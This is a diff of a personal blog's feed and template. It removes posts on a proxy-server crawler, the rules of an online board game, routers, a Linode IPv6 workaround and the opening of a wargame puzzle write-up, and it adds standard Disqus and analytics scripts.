-<h2>Requirements</h2>
+</footer>
+	<script src="/javascripts/slash.js"></script>
 
-<ul>
-<li>Python >= 2.7</li>
-<li>Scrapy 1.3.0 (not tested for lower version)</li>
-<li>node (for some sites, you need node to bypass waf based on javascript)</li>
-</ul>
 
+<script type="text/javascript">
+      var disqus_shortname = 'xelz';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://xelz.info/blog/2017/02/18/lego-cube-solver/';
+        var disqus_url = 'http://xelz.info/blog/2017/02/18/lego-cube-solver/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//go.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
 
-<h2>Usage</h2>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">cd </span>proxy_server_crawler
-</span><span class='line'>scrapy crawl chunzhen
-</span></code></pre></td></tr></table></div></figure>
 
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-41665464-1']);
+		_gaq.push(['_trackPageview']);
 
-<p>[log]</p>
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span> result<span class="o">]</span> ip: 59.41.214.218  , port: 3128 , <span class="nb">type</span>: http, proxy server not alive or healthy.
-</span><span class='line'><span class="o">[</span> result<span class="o">]</span> ip: 117.90.6.67    , port: 9000 , <span class="nb">type</span>: http, proxy server not alive or healthy.
-</span><span class='line'><span class="o">[</span> result<span class="o">]</span> ip: 117.175.183.10 , port: 8123 , speed: 984 , <span class="nb">type</span>: high
-</span><span class='line'><span class="o">[</span> result<span class="o">]</span> ip: 180.95.154.221 , port: 80   , <span class="nb">type</span>: http, proxy server not alive or healthy.
-</span><span class='line'><span class="o">[</span> result<span class="o">]</span> ip: 110.73.0.206   , port: 8123 , <span class="nb">type</span>: http, proxy server not alive or healthy.
-</span><span class='line'><span class="o">[</span>  proxy<span class="o">]</span> ip: 124.88.67.54   , port: 80   , speed: 448 , <span class="nb">type</span>: high       , post: True , ssl: False
-</span><span class='line'><span class="o">[</span> result<span class="o">]</span> ip: 117.90.2.149   , port: 9000 , <span class="nb">type</span>: http, proxy server not alive or healthy.
-</span><span class='line'><span class="o">[</span> result<span class="o">]</span> ip: 115.212.165.170, port: 9000 , <span class="nb">type</span>: http, proxy server not alive or healthy.
-</span><span class='line'><span class="o">[</span>  proxy<span class="o">]</span> ip: 118.123.22.192 , port: 3128 , speed: 769 , <span class="nb">type</span>: high       , post: True , ssl: False
-</span><span class='line'><span class="o">[</span>  proxy<span class="o">]</span> ip: 117.175.183.10 , port: 8123 , speed: 908 , <span class="nb">type</span>: high       , post: True , ssl: True
-</span></code></pre></td></tr></table></div></figure>
 
 
-<h2>License</h2>
 
-<p>The MIT License (MIT)</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Damned Rooms]]></title>
-    <link href="http://xelz.info/blog/2015/10/30/damned-rooms/"/>
-    <updated>2015-10-30T10:00:00+00:00</updated>
-    <id>http://xelz.info/blog/2015/10/30/damned-rooms</id>
-    <content type="html"><![CDATA[<h2>游戏名称</h2>
-
-<p><strong>密室惊魂Online</strong></p>
-
-<h2>项目说明</h2>
-
-<p>这个桌游是一个曾经开桌游店的同事送的，觉得这个游戏很有意思，但是一般需要5-8人，线下组局太难了。加入官方QQ群之后发现大家会在QQ群里通过建讨论组的方式来在线组局。此种方式需要一个MC主持游戏，每个人的选择和行动都是私聊给MC，MC通过PS软件绘制游戏地图，并通过各种图层来控制元素的堆放和移动，然后截图发在讨论组里。不禁感慨玩家的智慧是多么的强大。</p>
-
-<p>后来我就在想，何不用程序来代替MC和PS呢？于是这个项目就诞生了。</p>
-
-<p><strong>托管地址</strong>：<a href="https://github.com/xelzmm/danmned">https://github.com/xelzmm/danmned</a></p>
-
-<p><strong>开发语言</strong>：nodejs</p>
-
-<p><strong>相关技术</strong>：ejs, websocket, css3</p>
-
-<p><strong>游戏截图</strong></p>
-
-<p><img src="http://xelz.info/assets/2015/damned.png" alt="教学界面" /></p>
-
-<h2>游戏介绍</h2>
-
-<p>密室惊魂是一款运用语言和推理逻辑，结合区域行动策略的版图桌面游戏。
-游戏讲述一群中毒的受害者被奸徒困在一个完美密室里，大家需要在有限的时间内互相交流合作，寻找线索破解迷题，最终突破奸徒的阻挠找到出口逃生。该款游戏的特色是将玩家的语言交流和实际行动相结合，是一个考验玩家之间合作和显示玩家智慧的新型语言推理类桌面游戏。</p>
-
-<p><strong>游戏人数</strong>： 5到9人，已支持3-4人的mini模式</p>
-
-<p><strong>游戏时长</strong>： 约60至90分钟</p>
-
-<p><strong>游戏类型</strong>： 语言推理类</p>
-
-<!-- more -->
-
-
-<p><strong>网杀地址</strong>： <a href="http://msjh.aliapp.com/">http://msjh.aliapp.com/</a> (已失效)   <a href="http://msjh.shinemarketing.cn">http://msjh.shinemarketing.cn</a></p>
-
-<p><strong>游戏Ｑ群</strong>：205189960 <a href="http://shang.qq.com/wpa/qunwpa?idkey=5c2b3d7e0616c2711001a6e8ab9661d9b0d6ae321169afb09e4fa0b38911e7ce"><img src="http://pub.idqqimg.com/wpa/images/group.png" alt="密室惊魂" /></a> (约战，问询，交流)</p>
-
-<h2>主要特色</h2>
-
-<ul>
-<li>使用文字输入来表述自己。</li>
-<li>使用自己专属的线索列表。</li>
-<li>标记出已监控线索的玩家状态。</li>
-<li>电脑当MC，全自动随机地图身份线索，智能移动路径提示。</li>
-<li>可以将游戏中的玩家的精彩对局记录下来。</li>
-<li>惊心动魄的密室文字冒险。</li>
-</ul>
-
-
-<h2>游戏说明</h2>
-
-<h3>准备进入游戏</h3>
-
-<ul>
-<li>进入游戏首页，并设定昵称。</li>
-<li>首次进入游戏首页，或者直接进入游戏，会强制要求设定昵称。</li>
-<li>昵称可在游戏首页进行修改</li>
-<li>创建游戏，或者直接加入已有游戏房间</li>
-<li>直接复制已创建好的房间URL即可直接进入游戏</li>
-<li>也可直接进入已有游戏观战（第三人称视角）</li>
-<li>进入游戏后可以聊天、切换准备状态</li>
-<li>当玩家数量>=3，且全部准备就绪，游戏将自动开始</li>
-</ul>
-
-
-<h3>游戏规则</h3>
-
-<ul>
-<li>按照《密室惊魂》大屋标准版规则执行</li>
-<li>每局游戏地图完全<code>随机</code>，安全房间只有一个(1号-12号房间内随机)</li>
-<li><code>受害者</code>目标：解除身上的剧毒，并通过获取线索找出安全房间逃生
-
-<ul>
-<li><code>逃生</code>定义：最后一回合时，已解毒，并处于安全房间内</li>
-<li><code>受害者总人数-2</code>完成逃生，即视作受害者团体胜利</li>
-</ul>
-</li>
-<li><code>奸徒</code>目标：阻止受害者逃生，受害者失败即为奸徒胜利
-
-<ul>
-<li>奸徒不需要<code>逃生</code>，逃生与否，不影响奸徒胜利</li>
-</ul>
-</li>
-<li><code>EX受害者</code>目标：与受害者一起逃生或者单独逃生
-
-<ul>
-<li>首先EX是受害者的一员，受害者胜利EX同样胜利</li>
-<li>其次，EX可以单独逃生，即当<code>只有</code>EX逃生时，EX单独胜利</li>
-<li>EX单独胜利，代表奸徒(若有)胜利，受害者失败</li>
-</ul>
-</li>
-<li><code>SP暗警</code>目标：解除身上的剧毒，并通过获取线索找出安全房间逃生
-
-<ul>
-<li>SP暗警属于普通受害者的一员</li>
-<li>SP暗警可以在拆弹时进行伏击(出<code>破坏</code>卡)，如若此做
-
-<ul>
-<li>若有奸徒选择破坏，则伏击成功，炸弹直接被解除，游戏增加一回合</li>
-<li>若无奸徒破坏，则因暗警失误造成拆弹失败</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>一定几率出现<code>EX受害者</code>/<code>SP暗警</code>/<code>奸徒</code>，人数越多几率越大</li>
-<li>扩展规则</li>
-<li>6人局增加<code>13号房间危险</code>一级线索卡，用于增加难度</li>
-<li>7人局增加<code>大厅危险</code>一级线索卡，用于增加难度</li>
-<li>8人局增加大厅<code>毒雾</code>功能，用于增加难度</li>
-<li>9人局增加<code>黑色房间危险</code>二级线索卡，用于增加难度</li>
-<li>增加的线索卡无线索意义，但可以用于升级、降级、销毁</li>
-</ul>
-
-
-<h4>发言阶段</h4>
-
-<ul>
-<li>按照<code>密室法则</code>依次发言</li>
-<li>每个玩家限时第一回合<code>70秒</code>，后续每回合<code>增加10秒</code></li>
-<li>发言期间，超过<code>15秒</code>无任何输入动作将自动超时结束</li>
-<li>不是自己的发言时间，禁止发言，但可以打字，提前准备发言内容</li>
-<li>玩家在此阶段可以作<code>任意发言</code></li>
-<li>输入指令<code>/xs</code>可以输出自己的线索标记状态</li>
-<li>发言中包含<code>over</code>字样，或者提交<code>空发言</code>，将提前结束发言</li>
-<li>满足钥匙<code>索要</code>或者<code>赠予</code>条件(自己没有/有钥匙，同房间内有其他有/没有钥匙的玩家)，可在此阶段发动</li>
-<li>发言按钮旁边会出现<code>索要/赠予</code>按钮</li>
-<li>发动后将会在<code>自己发言完毕时</code>询问目标玩家是否同意/接受</li>
-<li>目标玩家回应限时<code>15秒</code>，超时自动拒绝(索要)/接受(赠予)</li>
-<li>满足抢钥匙条件(同一房间玩家数>=3，且至少一人有钥匙)，没有钥匙的玩家可在此阶段发动抢钥匙</li>
-<li>发言按钮旁边会出现<code>抢钥匙</code>的按钮</li>
-<li>发动抢钥匙，则会在<code>当前房间内所有玩家</code>都发言完毕后进行<code>投票</code></li>
-<li>若存在两把以上的钥匙，先投票决定抢<code>谁</code>的钥匙，再投票<code>抢钥匙</code></li>
-<li>投票限时<code>15秒</code>，超时自动<code>弃权</code></li>
-<li>投票结束后会公布投票情况，并决定钥匙归属</li>
-<li>投票结果出现平票或者全部弃权，钥匙保留在原玩家身上</li>
-<li>如其他玩家说出线索卡内容，可自行<code>点击线索区域</code>进行标记</li>
-</ul>
-
-
-<h4>移动阶段</h4>
-
-<ul>
-<li>按照<code>密室法则</code>依次移动，每个玩家限时<code>30秒</code></li>
-<li>每次移动，可以走1-2步
-
-<ul>
-<li>进入相邻房间为1步，进入对角房间视为2步</li>
-</ul>
-</li>
-<li>不是自己的移动时间，无法移动</li>
-<li>超时将<code>自动移动</code>，在满足规则前提下完全随机(不会上锁)</li>
-<li>轮到玩家移动时，<code>点击要去的房间</code>，自动计算可选路径及<code>上锁/解锁</code>方案</li>
-<li>在<code>有钥匙</code>的前提下</li>
-<li>离开有解锁标记的房间，可以回头上锁</li>
-<li>进入有解锁标记的房间，可以将该房间上锁</li>
-<li>进入有上锁标记的房间，必须将该房间解锁</li>
-<li>停留在有上锁标记的房间，可以将该房间解锁</li>
-<li>途径的房间无法上锁/解锁</li>
-<li>一次移动过程中最多使用一次钥匙</li>
-<li>密室中任意时刻最多只能有3个房间被锁上</li>
-<li>在允许停留的情况下，<code>点击自己所在房间</code>，可以<code>停留</code></li>
-<li>大厅允许无条件停留</li>
-<li>逃生前一回合允许无条件停留</li>
-<li>在已上锁的房间内允许无条件停留</li>
-<li>在周围房间都已上锁的房间内允许无条件停留</li>
-<li>在已上锁的房间内允许解锁后停留(需有钥匙)</li>
-<li>在有锁但未上锁的房间内，可以上锁后停留(需有钥匙)</li>
-<li>除了以上允许停留的情况外，此阶段<code>必须移动</code>，不得停留在原房间</li>
-</ul>
-
-
-<h4>时间阶段</h4>
-
-<ul>
-<li>时间标记增加一回合</li>
-<li>如果到达第8回合(未成功拆弹两次)或者第9回合(已成功拆弹两次)，则进行游戏结算，公布<code>玩家身份</code>及<code>安全房间</code>，游戏结束</li>
-</ul>
-
-
-<h4>执行阶段</h4>
-
-<ul>
-<li>按顺序依次执行房间功能</li>
-<li>按照房间号码 0(大厅)、1、2&hellip;12的顺序依次执行每个房间的功能</li>
-<li>每个房间内按照<code>密室法则</code>，决定房间功能执行者，并执行房间功能</li>
-<li><code>密室法则</code>：每个房间内，只有<code>一个人</code>可以执行房间功能</li>
-<li>【L】代表房间内号码最大的玩家获得执行权</li>
-<li>【S】代表房间内号码最小的玩家获得执行权</li>
-<li>如遇以下几种情况，<code>让过</code>执行权给房间内下一位玩家(若有)</li>
-<li>玩家在解毒房间，但已经解毒</li>
-<li>玩家在线索房间，已经持有线索卡，并且选择不销毁线索卡</li>
-<li>玩家在升级/降级房间，但是没有线索卡，或者没有可与其合成的方案</li>
-<li>如遇以下几种情况，<code>跳过</code>房间功能执行</li>
-<li>玩家在监视房间，但是没有人可被监视</li>
-<li>玩家在线索房间，但是线索卡区域已经没有1级线索卡</li>
-<li>玩家在小号的拆弹房间，但是炸弹已经解除或者控制器已经被破坏</li>
-<li>玩家在大号的拆弹房间</li>
-<li>如房间内有<code>钥匙</code>，则按照房间L/S属性，没有钥匙的最大/小号玩家获得钥匙</li>
-<li><code>行动</code>：拆弹/升级/降级</li>
-<li>限时<code>15秒</code></li>
-<li>分别询问参与行动的玩家<code>配合</code>还是<code>破坏</code></li>
-<li>至少有1人<code>破坏</code>，则行动失败
-
-<ul>
-<li> 特殊情况，拆弹时，如有两个<code>破坏</code>，即<code>奸徒</code>与<code>SP暗警</code>都<code>破坏</code>，视作<code>SP暗警</code>破坏了<code>奸徒</code>的行动，炸弹直接被解除，游戏增加一回合</li>
-</ul>
-</li>
-<li>房间功能，以下省略的主语均代指<code>获得房间功能执行权的玩家</code></li>
-<li><code>大厅</code>
-
-<ul>
-<li>大厅必定是危险房间，没有任何功能</li>
-<li>8人局以上，大厅增加功能<code>毒雾</code></li>
-<li>停留在大厅的玩家将会<code>中毒</code>，<code>经过</code>毒雾大厅，不会中毒</li>
-<li>对尚未解毒的玩家没有任何影响</li>
-<li>中毒后，玩家棋子由<code>绿色</code>变为<code>红色</code></li>
-<li><code>毒雾</code>会在第6回合发言阶段之前散去，停留不再中毒</li>
-</ul>
-</li>
-<li><code>治疗</code>房间
-
-<ul>
-<li>进行<code>解毒</code>(逃生的必要条件)</li>
-<li>解毒后，玩家棋子由<code>红色</code>变为<code>绿色</code></li>
-</ul>
-</li>
-<li><code>线索</code>房间
-
-<ul>
-<li>没有线索卡则获得一张<code>【1】级线索卡</code>，获得后，自动标记线索区</li>
-<li>有线索卡则可选择是否<code>销毁线索卡</code>(销毁后不能立刻获得新的线索卡)</li>
-<li>任何时间一名玩家只能持有<code>一张线索卡</code>(无论等级)</li>
-</ul>
-</li>
-<li><code>监视</code>房间
-
-<ul>
-<li>查看任意一名<code>不在监视房</code>的玩家手中的线索卡</li>
-<li>查看后，自动标记自己的线索区</li>
-<li>无法查看在<code>任意监视房</code>内的其他玩家的线索卡</li>
-</ul>
-</li>
-<li><code>升级</code>房间 / <code>降级</code> 房间
-
-<ul>
-<li><code>同房间内</code>的<code>两张</code>低(高)等级线索卡合成为一张高(低)等级线索卡</li>
-<li>如成功发起，则参与合成的两名玩家，进入<code>行动</code>步骤</li>
-<li><code>1 + 1 = 2</code>, <code>1 + 2 = 3</code>, 其他不可升级</li>
-<li><code>3 - 1 = 2</code>, <code>3 - 2 = 1</code>, <code>2 - 1 = 1</code>, 其他不可降级</li>
-<li>如存在多名可与之合成的玩家，则先<code>询问</code>与谁合成</li>
-<li>合成后的线索卡归<code>房间功能执行者</code>所有，原线索卡<code>消失</code></li>
-<li>合成后获得线索卡的玩家自动获得线索区标记</li>
-<li>合成失败，线索卡各自保留</li>
-</ul>
-</li>
-<li><code>拆弹</code>房间：<code>两个拆弹房间</code>合力进行拆弹
-
-<ul>
-<li>两个拆弹房间<code>各至少1人</code>，才可发起拆弹</li>
-<li>两个拆弹房间<code>总人数</code>大于等于以下标准，才可发起拆弹</li>
-<li>5人局 第一次2人，第二次2人</li>
-<li>6人局 第一次2人，第二次3人</li>
-<li>7人局 第一次2人，第二次3人</li>
-<li>8人局 第一次3人，第二次3人</li>
-<li>9人局 第一次3人，第二次4人</li>
-<li>如成功发起，则两个拆弹房间内的<code>所有玩家</code>，进入<code>行动</code>步骤</li>
-<li><code>受害者</code>及<code>EX受害者</code>只能<code>配合</code>，<code>奸徒</code>和<code>SP暗警</code>可以<code>破坏</code></li>
-<li>至多可以拆弹两次，若两次均成功，或暗警伏击成功，游戏<code>增加一回合</code></li>
-<li>如拆弹失败，控制器被<code>永久破坏</code>，不可再次拆弹</li>
-</ul>
-</li>
-</ul>
-
-
-<h4>思考阶段</h4>
-
-<ul>
-<li>思考<code>15秒</code>，规划下一阶段的发言/行动</li>
-<li>此时会提示<code>剩余线索卡</code>张数、下一轮拆弹(如果可以)所需人数</li>
-<li>15秒过后，回到发言阶段继续<code>下一轮</code></li>
-</ul>
-
-
-<h3>mini模式</h3>
-
-<ul>
-<li><code>3-4人</code>游戏时自动开启<code>mini模式</code></li>
-<li>去掉<code>1、5、8、12号</code>房间</li>
-<li>去掉<code>拆弹</code>房间、<code>降级</code>房间</li>
-<li>去掉<code>钥匙</code>及<code>锁</code>功能</li>
-<li>去掉<code>3级线索卡</code></li>
-<li>去掉<code>EX受害者</code>、<code>SP暗警</code></li>
-<li>回合数固定为<code>8</code></li>
-<li>受害者胜利条件变为<code>逃生人数 &gt;= 受害者总人数 - 1</code></li>
-</ul>
-
-
-<h3>注意事项</h3>
-
-<ul>
-<li>线索区为<code>个人线索区</code></li>
-<li>自己的线索区<code>只能自己看到</code>，并不与其他玩家共享</li>
-<li>获得线索卡，或者查看到别人的线索卡，则自动进行标记，可以点击进行修改</li>
-<li>别人在发言阶段报出线索卡内容，可以<code>自行点击线索区</code>标记</li>
-<li>发言阶段输入<code>/xs</code>，可以自动输出自己的线索区标记状态至发言区</li>
-<li>游戏断线后会<code>自动重连</code>，请不要关闭或者刷新游戏页面，否则游戏将直接结束。</li>
-<li>如发现bug，请在官方QQ群(<a href="http://shang.qq.com/wpa/qunwpa?idkey=5c2b3d7e0616c2711001a6e8ab9661d9b0d6ae321169afb09e4fa0b38911e7ce">205189960</a>)进行反馈，同时提供以下信息</li>
-<li>操作系统版本</li>
-<li>浏览器版本</li>
-<li>完整的游戏记录(从聊天区复制出来即可)</li>
-</ul>
-
-
-<h2>版权声明</h2>
-
-<ul>
-<li>《密室惊魂Online》</li>
-<li>设计&amp;开发：<strong><a href="http://xelz.info">xelz</a></strong></li>
-<li>监制：KbueCat</li>
-<li>Online版本在获得官方许可下制作，但不作为官方版本发布、发售</li>
-<li>代码开源(<a href="https://github.com/xelzmm/damned">github</a>)，遵循<a href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://i.creativecommons.org/l/by-nc-sa/4.0/80x15.png" alt="CC(BY-NC-SA)" /></a>协议，禁止用于商业用途</li>
-<li>《密室惊魂》</li>
-<li>设计总监：KbueCat</li>
-<li>游戏版权归<strong>创游文化</strong>所有，包括但不限于制作Online版本使用到的游戏创意、规则、素材等</li>
-</ul>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[什么是路由器(译)？]]></title>
-    <link href="http://xelz.info/blog/2014/12/17/what-is-a-router/"/>
-    <updated>2014-12-17T03:36:53+00:00</updated>
-    <id>http://xelz.info/blog/2014/12/17/what-is-a-router</id>
-    <content type="html"><![CDATA[<p>Origin：<a href="http://www.inetdaemon.com/tutorials/internet/ip/routing/define_router.shtml">http://www.inetdaemon.com/tutorials/internet/ip/routing/define_router.shtml</a></p>
-
-<p>路由器(包括无线路由器)，是一种连接两个以上不同的网络、具备网络间数据包转发功能的专用网络设备。它基于IP协议，工作在网络层(OSI七层模型的第3层)。路由器的主要功能是将不同的网络连接起来，让它们相互间能够进行数据交换，并将局域网内不必要的广播流量精确地发送到目标主机。有很多制造路由器的厂商，简单列举一些：Cisco(思科)，Linksys，Juniper，Netgear(网件)，Nortel (北电)，Redback，Lucent(朗讯)，3Com，HP(惠普)，Dlink，Belkin(贝尔金)等。</p>
-
-<p>有一些网络技能认证考试(如CCNA，CCNP，JNCIA，JNCIE)会考你区分网络设备的能力。这篇关于路由器的文章主要会解释如何辨别路由器，路由器有哪些功能(当然不包含某些厂商特有的技术)。</p>
-
-<!-- more-->
-
-
-<h3>路由器如何工作？</h3>
-
-<p>我们用普通家用无线宽带路由器举一个非常简单的例子</p>
-
-<ol>
-<li>接通电源并开机，从闪存中加载操作系统启动</li>
-<li>载入NVRAM中的配置，启动所有的网络接口并设置好路由协议</li>
-<li>在路由表中为每个网络接口添加地址和子网掩码</li>
-<li>家用路由器中有一条简单的静态路由：所有非本地流量全部路由到WAN口</li>
-<li>每当路由器收到一个网页的访问请求，都会在路由表中检索要访问的目标IP地址</li>
-<li>数据包中的目的地址就是路由表中的索引，根据索引找到对应的路由，这条路由会表明这个请求需要从哪个网络接口转发出去</li>
-<li>把数据包通过正确的网络接口发给下一跳路由，下一跳路由重复同样的路由转发操作直到数据包到达目的主机。</li>
-</ol>
-
-
-<p>这个过程对于<em>大部分</em>路由器都适用。</p>
-
-<p>PS: 稍微解释下，家用宽带路由器以及无线路由器同样肩负着“代理”的任务，它们会把IP数据包中的源IP改成路由器自己的IP，这一点跟运营商级别的路由器是不同的。</p>
-
-<h3>我为什么需要路由器？</h3>
-
-<p>路由器可以把不同的网络连接起来，并且实现以下功能，希望你看过之后能在网络认证考试中正确地描述路由器：</p>
-
-<h5>路由器的功能</h5>
-
-<ol>
-<li>限制局域网的广播流量</li>
-<li>作为默认网关</li>
-<li>进行协议转换(比如从有线的以太网到无线网络，或者以太网到有线电视)</li>
-<li>在不同网络间路由数据包</li>
-<li>学习并公布路由路径</li>
-<li>计算到每一个网络的最佳路由途径</li>
-</ol>
-
-
-<h3>限制局域网的广播流量</h3>
-
-<p>网络(尤其是以太网)在物理层、数据链路层和网络层是通过广播方式进行通信的。网络层的广播是指通过网络层协议(一般是IP或者IPX协议)将数据流量发送到网络上所有的主机。网络广播是用来传输特定的数据包(如ARP, RARP, DHCP, IPX-SAP等)从而使网络能够正常运转。因为有部分网络设备会尝试同时传输数据因而产生冲突，所以最好能通过交换机或者路由器把一个超大集群划分成不同的广播域。</p>
-
-<p>随着网络中主机数量的不断增长，广播数量也会随之增多。如果网络上涌现了足够多的广播流量，网络上的正常通信将会变得非常困难。</p>
-
-<p>为了减少广播的数量，网络管理员可以将一个包含大量主机的网络集群划分成两个小的网络。广播流量将被限制在各自的网络内部，而此时路由器则承担了连接互通两个网络的『默认网关』的作用。</p>
-
-<h3>作为默认网关</h3>
-
-<p>现如今的网络环境下，人们需要将电脑接入互联网。当你的电脑想跟另一个网络下的某一台电脑通信时，你的数据就会被发送给你的默认网关。默认网关是一台连接了和你的电脑同样网络的路由器。这台路由器作为默认网关，接收你的数据，寻找远端主机的地址并作出路由选择。根据路由的选择，默认网关会把你的数据转发给理远端主机更近的另一个网络设备。这中间可能会经过很多路由器，所以会有很多路由器参与处理你的数据包，就像消防队员救火时的水桶接力。</p>
-
-<h3>在不同网络间路由数据包</h3>
-
-<p>路由器具有将数据包从一个网络传送到另一个网络的能力。这使两个不同组织管理的不同网络之间的数据交换成为可能。他们可以在路由器之间创建一个中间网络并在这个网络上交换数据。因为路由器可以从任意接入的网络接收数据，并将其转发到其他网络，因此它也可以让不能正常通信的两个网络交换数据。技术角度来说，有了路由器，一个令牌环网络可以通过一个串行网络跟一个以太网进行通信。</p>
-
-<h3>学习并公布路由路径</h3>
-
-<p>路由器只有在使用诸如RIP,OSPF,EIGRP,IS-IS或者BGP等路由协议时，才会动态地学习路由并公布。否则路由器只能被手动设定，这种路由方式也被称作静态路由。</p>
-
-<p>路由器是『逐跳』传送数据的，就像『烫手的山芋』一跳接一跳。如果经过一系列路由器，数据还是没有到达目标主机，而是转了一圈回到某一跳路由节点，这杯称作路由环路。数据包在路由环路中一直传递直到生命周期结束：到达TTL上限。TTL是IP数据报文头部中的一个计数器。TTL的值会随着数据包在每一跳路由传递而递减，最终如果变成0就会被丢弃。</p>
-
-<h3>路由器的组成部分</h3>
-
-<p>路由器其实是特殊的计算机，因此和其他计算器有着相同的组成：</p>
-
-<ul>
-<li>中央处理器(CPU)</li>
-<li>闪存</li>
-<li>非易失性内存</li>
-<li>内存</li>
-<li>网络接口(网卡)</li>
-<li>控制台</li>
-</ul>
-
-
-<p><strong>中央处理器</strong>：运行路由器操作系统，例如Juniper路由器运行着JunOS，Cisco路由器运行着Cisco IOS(Nexus OS)。操作系统管理者路由器的各个组件，并提供路由器运行所必须的功能逻辑。</p>
-
-<p><strong>闪存</strong>：存储着操作系统，类似你电脑里的硬盘。如果你的电脑使用了SSD，那么它就用了闪存。(译注：SSD是闪存组成的)</p>
-
-<p><strong>非易失性内存</strong>：这是一块额外的空间，用来存储系统的备份或者原始操作系统。路由器会从这里开始引导，并加载所有的程序。</p>
-
-<p><strong>内存</strong>：当路由器启动时，操作系统已经被加载进了内存。一旦路由器完成了启动，就开始计算自身的路由，如果配置了RIP(v1及v2)，OSPF, EIGRP, IS-IS或者BGP等路由协议，也会从其他路由器学习路由。内存也用于缓存ARP表，路由表，路由距离以及其他可以加快路由转发的数据。</p>
-
-<p><strong>网络接口</strong>：路由器总是拥有许多网络接口(网卡)。操作系统中包含了可以控制这些网络接口的驱动程序。路由器会在启动的时候获知每个接口配置了什么样的网络。之后它们会从自身连接的其他路由器那里学习路由，并学习将数据包传送到某个远端网络需要通过哪个接口。</p>
-
-<p><strong>控制台</strong>：最后，很重要的一点，就是控制台。在以往的时间里，管理和配置路由器都是在每个设备上的控制台里进行，比如问题排查和错误诊断。网络认证考试中会包含非常多关于配置和排查问题的控制台命令。然而路由器的生产厂商正在迅速地淘汰设备上的独立控制台，转而建立中心化的管理系统用以管理大量的网络设备。</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Solution for Google banning Linodes]]></title>
-    <link href="http://xelz.info/blog/2014/07/28/resolve-google-ban-linode/"/>
-    <updated>2014-07-28T18:00:00+00:00</updated>
-    <id>http://xelz.info/blog/2014/07/28/resolve-google-ban-linode</id>
-    <content type="html"><![CDATA[<h3>Google banned Linodes</h3>
-
-<p>I usually use linode to visit Google services via ssh tunnel. but recently I always got captchas even <code>Sorry...</code> page.</p>
-
-<p>Finally I knows that google banned ipv6 traffics from linode which they treated as robots.</p>
-
-<h3>Solution</h3>
-
-<p>disable ipv6 of linode</p>
-
-<h4>for Ubuntu</h4>
-
-<p>append lines below to <code>/etc/sysctl.conf</code></p>
-
-<ul>
-<li><p>net.ipv6.conf.all.disable_ipv6=1</p></li>
-<li><p>net.ipv6.conf.default.disable_ipv6=1</p></li>
-<li><p>net.ipv6.conf.lo.disable_ipv6=1</p></li>
-</ul>
-
-
-<p>then restart network <code>/etc/init.d/networking restart</code> or <code>reboot</code></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[New to Jekyll!]]></title>
-    <link href="http://xelz.info/blog/2014/07/25/new-to-jekyll/"/>
-    <updated>2014-07-25T17:58:57+00:00</updated>
-    <id>http://xelz.info/blog/2014/07/25/new-to-jekyll</id>
-    <content type="html"><![CDATA[<p>Hello Jekyll.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Write Up of a Very Interesting Wargame]]></title>
-    <link href="http://xelz.info/blog/2014/06/09/write-up-of-a-very-interesting-wargame/"/>
-    <updated>2014-06-09T18:00:00+00:00</updated>
-    <id>http://xelz.info/blog/2014/06/09/write-up-of-a-very-interesting-wargame</id>
-    <content type="html"><![CDATA[<p>Recently I&rsquo;m playing a wargame named [shhhh&hellip; edited].</p>
-
-<p>I&rsquo;ve hidden the game name so that challengers could not find here by some searching work.</p>
-
-<p>If you guys are about to cheat by this, get lost now.</p>
-
-<p>You can find the game at [url]<code>c-a-n-y-o-u-h-a-c-k.i-t</code>(replace the dash with nothing)</p>
-
-<p>Try to figure out by yourself, if you are really really really stucked, have a sight for some hints.</p>
-
-<!-- more -->
-
-
-<h2>Logic</h2>
-
-<h4>Logic 1</h4>
-
-<p>password is just <code>password</code></p>
-
-<h4>Logic 2</h4>
-
-<p>It&rsquo;s a kind of pun. If you cannot guess the riddle, just answer <code>no</code>.</p>
-
-<p>Acturually the answer is Nitric Oxide, as known as <code>NO</code></p>
-
-<h4>Logic 3</h4>
-
-<p>Inspect the source code, you will find the password in comment.</p>
-
-<h4>Logic 4</h4>
-
-<p><strong>Fibonacci Prime</strong></p>
-
-<p>prime(n) = 2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271 &hellip;</p>
-
-<p>fibonacci(n) = 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144 &hellip;</p>
-
-<ul>
-<li>prime(fibonacci(1)) = prime(1) = 2</li>
